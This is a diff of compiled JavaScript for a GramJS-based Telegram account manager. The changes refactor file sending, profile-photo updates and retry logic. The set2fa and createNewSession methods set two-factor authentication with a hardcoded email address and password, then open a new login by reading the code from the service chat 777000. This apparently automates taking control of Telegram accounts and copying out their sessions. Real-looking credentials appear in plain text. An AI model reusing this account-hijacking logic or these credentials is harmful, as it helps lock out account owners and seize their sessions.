+                await new Promise((resolve, reject) => {
+                    const writer = fs.createWriteStream(filePath);
+                    response.data.pipe(writer);
+                    writer.on('finish', resolve);
+                    writer.on('error', reject);
+                });
+                return filePath;
+            },
+            cleanup: async () => {
+                try {
+                    if (fs.existsSync(filePath)) {
+                        fs.unlinkSync(filePath);
+                    }
+                }
+                catch (error) {
+                    console.warn(`Failed to cleanup file ${filePath}:`, (0, parseError_1.parseError)(error));
+                }
+            }
         });
-        return filePath;
     }
-    async updateProfilePic(image) {
+    async sendPhotoChat(id, url, caption, filename) {
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        let filePath = null;
         try {
-            const file = await this.client.uploadFile({
-                file: new uploads_1.CustomFile('pic.jpg', fs.statSync(image).size, image),
+            filePath = await this.getFileUrl(url, filename);
+            const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
+            await this.client.sendFile(id, { file, caption });
+        }
+        finally {
+            if (filePath && fs.existsSync(filePath)) {
+                try {
+                    fs.unlinkSync(filePath);
+                }
+                catch (error) {
+                    console.warn(`Failed to cleanup file ${filePath}:`, (0, parseError_1.parseError)(error));
+                }
+            }
+        }
+    }
+    async sendFileChat(id, url, caption, filename) {
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        let filePath = null;
+        try {
+            filePath = await this.getFileUrl(url, filename);
+            const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
+            await this.client.sendFile(id, { file, caption });
+        }
+        finally {
+            if (filePath && fs.existsSync(filePath)) {
+                try {
+                    fs.unlinkSync(filePath);
+                }
+                catch (error) {
+                    console.warn(`Failed to cleanup file ${filePath}:`, (0, parseError_1.parseError)(error));
+                }
+            }
+        }
+    }
+    async updateProfilePic(imagePath) {
+        if (!this.client)
+            throw new Error('Client is not initialized');
+        let shouldDeleteFile = false;
+        try {
+            if (imagePath.startsWith('http')) {
+                const tempFile = await this.getFileUrl(imagePath, 'profile.jpg');
+                imagePath = tempFile;
+                shouldDeleteFile = true;
+            }
+            const fileStats = fs.statSync(imagePath);
+            const file = new uploads_1.CustomFile('pic.jpg', fileStats.size, imagePath);
+            const uploadedFile = await this.client.uploadFile({
+                file,
                 workers: 1,
             });
-            console.log("file uploaded");
             await this.client.invoke(new tl_1.Api.photos.UploadProfilePhoto({
-                file: file,
+                file: uploadedFile,
             }));
-            console.log("profile pic updated");
         }
-        catch (error) {
-            throw error;
+        finally {
+            if (shouldDeleteFile && fs.existsSync(imagePath)) {
+                try {
+                    fs.unlinkSync(imagePath);
+                }
+                catch (error) {
+                    console.warn(`Failed to cleanup file ${imagePath}:`, (0, parseError_1.parseError)(error));
+                }
+            }
         }
     }
     async hasPassword() {
@@ -1057,155 +1202,319 @@ class TelegramManager {
         return passwordInfo.hasPassword;
     }
     async set2fa() {
-        if (!(await this.hasPassword())) {
-            console.log("Password Does not exist, Setting 2FA");
-            const imapService = IMap_1.MailReader.getInstance();
-            const twoFaDetails = {
-                email: "storeslaksmi@gmail.com",
-                hint: "password - India143",
-                newPassword: "Ajtdmwajt1@",
-            };
-            try {
+        return this.safeOperation({
+            execute: async () => {
+                const hasPassword = await this.hasPassword();
+                if (hasPassword) {
+                    console.log("Password already exists");
+                    return;
+                }
+                console.log("Password Does not exist, Setting 2FA");
+                const imapService = IMap_1.MailReader.getInstance();
+                const twoFaDetails = {
+                    email: "storeslaksmi@gmail.com",
+                    hint: "password - India143",
+                    newPassword: "Ajtdmwajt1@",
+                };
                 await imapService.connectToMail();
-                const checkMailInterval = setInterval(async () => {
-                    console.log("Checking if mail is ready");
-                    if (imapService.isMailReady()) {
-                        clearInterval(checkMailInterval);
-                        console.log("Mail is ready, checking code!");
-                        await this.client.updateTwoFaSettings({
-                            isCheckPassword: false,
-                            email: twoFaDetails.email,
-                            hint: twoFaDetails.hint,
-                            newPassword: twoFaDetails.newPassword,
-                            emailCodeCallback: async (length) => {
-                                console.log("Code sent");
-                                return new Promise(async (resolve, reject) => {
-                                    let retry = 0;
-                                    const codeInterval = setInterval(async () => {
-                                        try {
-                                            console.log("Checking code");
-                                            retry++;
-                                            if (imapService.isMailReady() && retry < 4) {
-                                                const code = await imapService.getCode();
-                                                console.log('Code:', code);
-                                                if (code) {
-                                                    await imapService.disconnectFromMail();
-                                                    clearInterval(codeInterval);
-                                                    resolve(code);
-                                                }
-                                            }
-                                            else {
-                                                clearInterval(codeInterval);
-                                                await imapService.disconnectFromMail();
-                                                reject(new Error("Failed to retrieve code"));
-                                            }
-                                        }
-                                        catch (error) {
-                                            clearInterval(codeInterval);
-                                            await imapService.disconnectFromMail();
-                                            reject(error);
-                                        }
-                                    }, 10000);
-                                });
-                            },
-                            onEmailCodeError: (e) => {
-                                console.error('Email code error:', (0, parseError_1.parseError)(e));
-                                return Promise.resolve("error");
+                return new Promise((resolve, reject) => {
+                    const maxRetries = 3;
+                    let retryCount = 0;
+                    const checkTimeout = 30000;
+                    const startTime = Date.now();
+                    const checkMailInterval = setInterval(async () => {
+                        try {
+                            if (Date.now() - startTime > checkTimeout) {
+                                clearInterval(checkMailInterval);
+                                await imapService.disconnectFromMail();
+                                reject(new Error("2FA setup timeout"));
+                                return;
                             }
-                        });
-                        return twoFaDetails;
-                    }
-                    else {
-                        console.log("Mail not ready yet");
-                    }
-                }, 5000);
+                            if (imapService.isMailReady()) {
+                                clearInterval(checkMailInterval);
+                                await this.setup2faWithEmail(imapService, twoFaDetails);
+                                resolve(twoFaDetails);
+                            }
+                            else if (++retryCount >= maxRetries) {
+                                clearInterval(checkMailInterval);
+                                await imapService.disconnectFromMail();
+                                reject(new Error("Mail service connection timeout"));
+                            }
+                        }
+                        catch (error) {
+                            clearInterval(checkMailInterval);
+                            await imapService.disconnectFromMail();
+                            reject(error);
+                        }
+                    }, 5000);
+                });
             }
-            catch (e) {
-                console.error("Unable to connect to mail server:", (0, parseError_1.parseError)(e));
+        });
+    }
+    async setup2faWithEmail(imapService, twoFaDetails) {
+        await this.client.updateTwoFaSettings({
+            isCheckPassword: false,
+            email: twoFaDetails.email,
+            hint: twoFaDetails.hint,
+            newPassword: twoFaDetails.newPassword,
+            emailCodeCallback: async () => {
+                return this.waitForEmailCode(imapService);
+            },
+            onEmailCodeError: (error) => {
+                console.error('Email code error:', (0, parseError_1.parseError)(error));
+                return Promise.resolve("error");
+            }
+        });
+    }
+    async waitForEmailCode(imapService) {
+        const maxAttempts = 4;
+        const checkInterval = 10000;
+        return new Promise(async (resolve, reject) => {
+            let attempts = 0;
+            const checkCode = async () => {
+                try {
+                    if (attempts >= maxAttempts) {
+                        await imapService.disconnectFromMail();
+                        reject(new Error("Failed to retrieve code after maximum attempts"));
+                        return;
+                    }
+                    if (imapService.isMailReady()) {
+                        const code = await imapService.getCode();
+                        if (code) {
+                            await imapService.disconnectFromMail();
+                            resolve(code);
+                            return;
+                        }
+                    }
+                    attempts++;
+                    setTimeout(checkCode, checkInterval);
+                }
+                catch (error) {
+                    await imapService.disconnectFromMail();
+                    reject(error);
+                }
+            };
+            checkCode();
+        });
+    }
+    async createNewSession() {
+        return this.safeOperation({
+            execute: async () => {
+                const me = await this.client.getMe();
+                if (!me.phone)
+                    throw new Error('Failed to get phone number');
+                const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID || '', 10), process.env.API_HASH || '', {
+                    connectionRetries: 1,
+                    timeout: 30000
+                });
+                await newClient.start({
+                    phoneNumber: me.phone,
+                    password: async () => "Ajtdmwajt1@",
+                    phoneCode: async () => {
+                        console.log('Waiting for the OTP code from chat ID 777000...');
+                        const code = await this.waitForOtp();
+                        if (!code)
+                            throw new Error('Failed to get OTP code');
+                        return code;
+                    },
+                    onError: (err) => {
+                        const parsedError = (0, parseError_1.parseError)(err);
+                        throw new Error(`Session creation failed: ${parsedError.message}`);
+                    }
+                });
+                const session = newClient.session.save();
+                await newClient.disconnect();
+                return session;
+            }
+        });
+    }
+    async waitForOtp() {
+        const maxAttempts = 3;
+        const checkInterval = 5000;
+        const messageValidityWindow = 60000;
+        for (let attempt = 0; attempt < maxAttempts; attempt++) {
+            try {
+                const messages = await this.retryOperation(() => this.client.getMessages('777000', { limit: 1 }), 2);
+                const message = messages[0];
+                if (!message) {
+                    console.log("No messages found");
+                    continue;
+                }
+                const isRecent = message.date * 1000 > Date.now() - messageValidityWindow;
+                const code = this.extractOtpFromMessage(message.text);
+                if (!code) {
+                    console.log("Invalid message format");
+                    continue;
+                }
+                if (isRecent || attempt === maxAttempts - 1) {
+                    console.log("Using code:", code);
+                    return code;
+                }
+                console.log("Message too old:", new Date(message.date * 1000).toISOString());
+                await (0, Helpers_1.sleep)(checkInterval);
+            }
+            catch (error) {
+                const parsedError = (0, parseError_1.parseError)(error);
+                console.warn(`OTP attempt ${attempt + 1} failed:`, parsedError);
+                if (attempt < maxAttempts - 1) {
+                    await (0, Helpers_1.sleep)(2000 * (attempt + 1));
+                }
             }
         }
-        else {
-            console.log("Password already exists");
+        throw new Error('Failed to get OTP after maximum attempts');
+    }
+    extractOtpFromMessage(text) {
+        try {
+            const match = text.split('.')[0].split("code:**")[1]?.trim();
+            return match || null;
+        }
+        catch {
+            return null;
         }
     }
-    async sendPhotoChat(id, url, caption, filename) {
-        if (!this.client)
-            throw new Error('Client is not initialized');
-        const filePath = await this.getFileUrl(url, filename);
-        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
-        await this.client.sendFile(id, { file, caption });
+    async downloadWithTimeout(promise, timeout) {
+        return Promise.race([
+            promise,
+            new Promise((_, reject) => setTimeout(() => reject(new Error('Download timeout')), timeout))
+        ]);
     }
-    async sendFileChat(id, url, caption, filename) {
-        if (!this.client)
+    async retryOperation(operation, retries = TelegramManager.MAX_RETRIES) {
+        for (let i = 0; i < retries; i++) {
+            try {
+                return await operation();
+            }
+            catch (error) {
+                if (i === retries - 1)
+                    throw error;
+                const parsedError = (0, parseError_1.parseError)(error);
+                if (parsedError.message.includes('FLOOD_WAIT')) {
+                    const waitTime = parseInt(parsedError.message.match(/FLOOD_WAIT_(\d+)/)?.[1] || '30', 10);
+                    await (0, Helpers_1.sleep)(waitTime * 1000);
+                }
+                else {
+                    await (0, Helpers_1.sleep)(2000 * (i + 1));
+                }
+            }
+        }
+        throw new Error('Operation failed after max retries');
+    }
+    async safeOperation({ execute, cleanup }) {
+        if (!this.client) {
             throw new Error('Client is not initialized');
-        const filePath = await this.getFileUrl(url, filename);
-        const file = new uploads_1.CustomFile(filePath, fs.statSync(filePath).size, filename);
-        await this.client.sendFile(id, { file, caption });
+        }
+        try {
+            return await execute();
+        }
+        catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            if (parsedError.message.includes(TelegramErrorCode.FLOOD_WAIT)) {
+                const waitTime = parseInt(parsedError.message.match(/FLOOD_WAIT_(\d+)/)?.[1] || '30', 10);
+                await (0, Helpers_1.sleep)(waitTime * 1000);
+                return await execute();
+            }
+            throw error;
+        }
+        finally {
+            if (cleanup) {
+                try {
+                    await cleanup();
+                }
+                catch (cleanupError) {
+                    console.warn('Cleanup failed:', (0, parseError_1.parseError)(cleanupError));
+                }
+            }
+        }
     }
     async deleteProfilePhotos() {
+        if (!this.client)
+            throw new Error('Client is not initialized');
         try {
             const result = await this.client.invoke(new tl_1.Api.photos.GetUserPhotos({
                 userId: "me"
             }));
-            console.log(`Profile Pics found: ${result.photos.length}`);
-            if (result && result.photos?.length > 0) {
-                const res = await this.client.invoke(new tl_1.Api.photos.DeletePhotos({
-                    id: result.photos
+            console.log(`Profile pictures found: ${result.photos.length}`);
+            if (result?.photos?.length > 0) {
+                await this.client.invoke(new tl_1.Api.photos.DeletePhotos({
+                    id: result.photos.map(photo => new tl_1.Api.InputPhoto({
+                        id: photo.id,
+                        accessHash: photo.accessHash,
+                        fileReference: photo.fileReference
+                    }))
                 }));
+                console.log("Deleted profile photos");
             }
-            console.log("Deleted profile Photos");
         }
         catch (error) {
+            const parsedError = (0, parseError_1.parseError)(error);
+            console.error('Error deleting profile photos:', parsedError);
             throw error;
         }
     }
-    async createNewSession() {
-        const me = await this.client.getMe();
-        console.log("Phne:", me.phone);
-        const newClient = new telegram_1.TelegramClient(new sessions_1.StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {
-            connectionRetries: 1,
-        });
-        await newClient.start({
-            phoneNumber: me.phone,
-            password: async () => "Ajtdmwajt1@",
-            phoneCode: async () => {
-                console.log('Waiting for the OTP code from chat ID 777000...');
-                return await this.waitForOtp();
-            },
-            onError: (err) => { throw err; },
-        });
-        const session = newClient.session.save();
-        await newClient.disconnect();
-        console.log("New Session: ", session);
-        return session;
-    }
-    async waitForOtp() {
-        for (let i = 0; i < 3; i++) {
-            try {
-                console.log("Attempt : ", i);
-                const messages = await this.client.getMessages('777000', { limit: 1 });
-                const message = messages[0];
-                if (message && message.date && message.date * 1000 > Date.now() - 60000) {
-                    const code = message.text.split('.')[0].split("code:**")[1].trim();
-                    console.log("returning: ", code);
-                    return code;
+    async getMediaMetadata(chatId = 'me', offset, limit = 100) {
+        return this.safeOperation({
+            execute: async () => {
+                const query = { limit };
+                if (offset)
+                    query.offsetId = offset;
+                const messages = await this.client.getMessages(chatId, query);
+                const mediaMessages = messages.filter(message => message.media && message.media.className !== "MessageMediaWebPage");
+                console.log(`Total: ${messages.total}, fetched: ${messages.length}, ChatId: ${chatId}, Media: ${mediaMessages.length}`);
+                if (!messages.length) {
+                    return { data: [], endOfMessages: true };
                 }
-                else {
-                    console.log("Message Date: ", new Date(message.date * 1000).toISOString(), "Now: ", new Date(Date.now() - 60000).toISOString());
-                    const code = message.text.split('.')[0].split("code:**")[1].trim();
-                    console.log("Skipped Code: ", code);
-                    if (i == 2) {
-                        return code;
+                const data = [];
+                const processPromises = mediaMessages.map(async (message) => {
+                    try {
+                        const thumbBuffer = await this.getMediaThumbnail(message);
+                        return {
+                            messageId: message.id,
+                            mediaType: message.media instanceof tl_1.Api.MessageMediaPhoto ? 'photo' : 'video',
+                            thumb: thumbBuffer?.toString('base64') || null,
+                        };
                     }
-                    await (0, Helpers_1.sleep)(5000);
+                    catch (error) {
+                        console.warn(`Failed to process message ${message.id}:`, (0, parseError_1.parseError)(error));
+                        return {
+                            messageId: message.id,
+                            mediaType: message.media instanceof tl_1.Api.MessageMediaPhoto ? 'photo' : 'video',
+                            thumb: null,
+                        };
+                    }
+                });
+                const results = await Promise.allSettled(processPromises);
+                results.forEach(result => {
+                    if (result.status === 'fulfilled') {
+                        data.push(result.value);
+                    }
+                });
+                if (!data.length && messages.length > 0) {
+                    data.push({
+                        messageId: messages[messages.length - 1].id,
+                        mediaType: 'photo',
+                        thumb: null,
+                    });
                 }
+                return { data, endOfMessages: false };
             }
-            catch (err) {
-                await (0, Helpers_1.sleep)(2000);
-                console.log(err);
-            }
+        });
+    }
+    async getMediaThumbnail(message) {
+        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
+            const sizes = message.photo?.sizes || [1];
+            return this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), TelegramManager.DOWNLOAD_TIMEOUT);
         }
+        else if (message.media instanceof tl_1.Api.MessageMediaDocument &&
+            message.document?.mimeType &&
+            (message.document.mimeType.startsWith('video') || message.document.mimeType.startsWith('image'))) {
+            const sizes = message.document?.thumbs || [1];
+            return this.downloadWithTimeout(this.client.downloadMedia(message, { thumb: sizes[1] || sizes[0] }), TelegramManager.DOWNLOAD_TIMEOUT);
+        }
+        return null;
     }
 }
+TelegramManager.DOWNLOAD_TIMEOUT = 5000;
+TelegramManager.CHUNK_SIZE = 512 * 1024;
+TelegramManager.MAX_FILE_SIZE = 5 * 1024 * 1024;
+TelegramManager.MAX_RETRIES = 3;
 exports.default = TelegramManager;
 //# sourceMappingURL=TelegramManager.js.map
